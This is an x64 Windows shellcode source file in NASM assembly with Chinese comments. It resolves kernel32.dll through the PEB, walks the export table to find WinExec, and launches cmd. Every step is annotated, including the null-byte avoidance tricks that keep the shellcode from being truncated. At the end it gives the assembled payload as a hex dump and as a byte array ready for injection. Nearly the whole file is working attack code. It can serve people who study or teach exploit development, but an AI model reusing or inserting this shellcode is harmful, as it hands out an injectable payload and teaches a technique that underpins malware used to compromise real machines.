;__author__：Pluviophile
;__email__ ：1565203609@qq.com
;__date__  ：2020/11/18

;调用WinExec打开一个新的cmd
;X86架构机器下PEB结构位于0x30偏移位置，Ldr位于0x0c偏移
;X64架构机器下PEB结构位于0x60偏移位置，Ldr位于0x18偏移
;其他具体的结构体偏移不同的请自行使用windbg观察
;寄存器作用：rbx存放kernel32.dll基址，rsi存放导出表中名称表的物理地址,r8存放导出表物理地址
;注意:偏移地址都为4字节

global start
section .text
start:
		pushfq	
										;获取kernel32.dll基址
		sub rsp,28h						;开辟栈区
		xor r8,r8
		xor rcx,rcx
		xor r10,r10
		add r10,60h						;直接gs:60h的话在转换成机器码时会出现00导致shellcode截断
		
		mov rax,[gs:r10]				;找到PEB,rax=PEB
		mov rax,[rax+18h]				;rax = PEB->Ldr
		mov rsi,[rax+20h]				;rsi = PEB->Ldr.InMemoryOrderModuleList
		lodsq							;获取ntdlll.dll模块			
		xchg rax,rsi					;交换rax与rsi的值
		lodsq							;获取kernel32.dll模块
		mov rbx,[rax+20h]				;获取kernel32.dll的基址

										;rbx=kernnel32.dll的基址，e_lfanew指向PE头，解析kernel32.dll的PE结构
		xor r8,r8						;异或将r8寄存器中每一位都清0
		mov r8d,[rbx+3ch]				;R8D = Dos Header-> e_lfanew偏移量,因为Dos Header-> e_lfanew只占四个字节
		xor rdx,rdx
		mov rdx,r8						;rdx = r8 = Dos Header-> e_lfanew
		add rdx,rbx						;kernel32.dll基址+e_lfanew，rdx=PE Header
		mov rax,0ffffffffffffffffh		;直接mov rax,88h可能会导致出现好几个字节的0
		sub rax,0ffffffffffffff77h		;使用减法让rax等于88h
		mov r8d,[rdx+rax]				;导出表偏移地址存在位置88h，此地址为4字节
		add r8,rbx						;基址+偏移=导出表的物理地址
		xor rsi,rsi						;异或将rsi寄存器每一位都清0
		mov esi,[r8+20h]				;获取导出表名称表偏移地址，此地址为4字节
		add rsi,rbx						;获取导出表名称表的物理地址
		xor rcx,rcx						;清空rcx寄存器,用于作为循环遍历的下标
		mov r9d,456e6957h;				;r9d寄存器赋值为字符串WinE(倒叙放入)

										;获取WinExec函数
		GetFun:							;循环遍历获取函数
			inc rcx						;rcx++
			xor rax,rax					;rax清0，用于存放函数名的物理地址
			mov eax,[rsi+rcx*4h]		;获取一个函数名称偏移地址，此地址为4字节
			add rax,rbx					;获取函数名称物理地址
			cmp dword [rax],r9d			;让dword[rax],r9d相减，但不保存结果只置标志位，相当于比较两值是否相同
			jnz GetFun					;如果标志位不为0则跳转，结合上面，相当于不相同则跳转
		xor rsi,rsi						;rsi清0，用于存放普通表的物理地址
		mov esi,[r8+24h]				;获取导出表中普通表的偏移，此地址为4字节
		add rsi,rbx						;偏移+基址=物理地址
		mov cx,[rsi+rcx*2h]				;功能的数量，此地址为2字节
		xor rsi,rsi						;rsi寄存器清0,用于存放偏移地址表的物理地址
		mov esi,[r8+1ch]				;导出表偏移地址表的偏移地址，此地址为4字节
		add rsi,rbx						;求出偏移地址表的物理地址
		xor rdx,rdx						;清空rdx，用于存放函数功能的物理地址
		mov edx,[rsi+rcx*4]				;获取到函数功能的偏移地址，此地址为4字节
		add rdx,rbx						;获取到物理地址
		mov rdi,rdx						;rdi=rdx

										;调用WinExec函数
		mov rax,0ffffffffffffffffh		;直接传入cmd字符串的ascii码会导致0截断
		sub rax,0ffffffffff9b929ch		;所以使用相减的方法
		push rax						;字符串cmd入栈
		mov rcx,rsp						;获取到字符串cmd的内存地址，rcx寄存器对应第一个参数
		xor rdx,rdx
		inc rdx							;rdx寄存器对应函数的第2个参数
		call rdi 						;调用WinExec("cmd", 1)

		add rsp,28h						;回收栈区
        popfq

		retn

;9C 48 83 EC 28 4D 31 C0 48 31 C9 4D 
;31 D2 49 83 C2 60 65 49 8B 02 48 8B 
;40 18 48 8B 70 20 48 AD 48 96 48 AD 
;48 8B 58 20 4D 31 C0 44 8B 43 3C 48 
;31 D2 4C 89 C2 48 01 DA 48 C7 C0 FF 
;FF FF FF 48 2D 77 FF FF FF 44 8B 04 
;02 49 01 D8 48 31 F6 41 8B 70 20 48 
;01 DE 48 31 C9 41 B9 57 69 6E 45 48 
;FF C1 48 31 C0 8B 04 8E 48 01 D8 44 
;39 08 75 EF 48 31 F6 41 8B 70 24 48 
;01 DE 66 8B 0C 4E 48 31 F6 41 8B 70 
;1C 48 01 DE 48 31 D2 8B 14 8E 48 01 
;DA 48 89 D7 48 C7 C0 FF FF FF FF 48 
;2D 9C 92 9B FF 50 48 89 E1 48 31 D2 
;48 FF C2 FF D7 48 83 C4 28 9D C3

;0x9C, 0x48, 0x83, 0xEC, 0x28, 0x4D, 0x31, 0xC0, 0x48, 0x31, 0xC9, 0x4D
;0x31, 0xD2, 0x49, 0x83, 0xC2, 0x60, 0x65, 0x49, 0x8B, 0x02, 0x48, 0x8B
;0x40, 0x18, 0x48, 0x8B, 0x70, 0x20, 0x48, 0xAD, 0x48, 0x96, 0x48, 0xAD
;0x48, 0x8B, 0x58, 0x20, 0x4D, 0x31, 0xC0, 0x44, 0x8B, 0x43, 0x3C, 0x48
;0x31, 0xD2, 0x4C, 0x89, 0xC2, 0x48, 0x01, 0xDA, 0x48, 0xC7, 0xC0, 0xFF
;0xFF, 0xFF, 0xFF, 0x48, 0x2D, 0x77, 0xFF, 0xFF, 0xFF, 0x44, 0x8B, 0x04
;0x02, 0x49, 0x01, 0xD8, 0x48, 0x31, 0xF6, 0x41, 0x8B, 0x70, 0x20, 0x48
;0x01, 0xDE, 0x48, 0x31, 0xC9, 0x41, 0xB9, 0x57, 0x69, 0x6E, 0x45, 0x48
;0xFF, 0xC1, 0x48, 0x31, 0xC0, 0x8B, 0x04, 0x8E, 0x48, 0x01, 0xD8, 0x44
;0x39, 0x08, 0x75, 0xEF, 0x48, 0x31, 0xF6, 0x41, 0x8B, 0x70, 0x24, 0x48
;0x01, 0xDE, 0x66, 0x8B, 0x0C, 0x4E, 0x48, 0x31, 0xF6, 0x41, 0x8B, 0x70
;0x1C, 0x48, 0x01, 0xDE, 0x48, 0x31, 0xD2, 0x8B, 0x14, 0x8E, 0x48, 0x01
;0xDA, 0x48, 0x89, 0xD7, 0x48, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0x48
;0x2D, 0x9C, 0x92, 0x9B, 0xFF, 0x50, 0x48, 0x89, 0xE1, 0x48, 0x31, 0xD2
;0x48, 0xFF, 0xC2, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x28, 0x9D, 0xC3
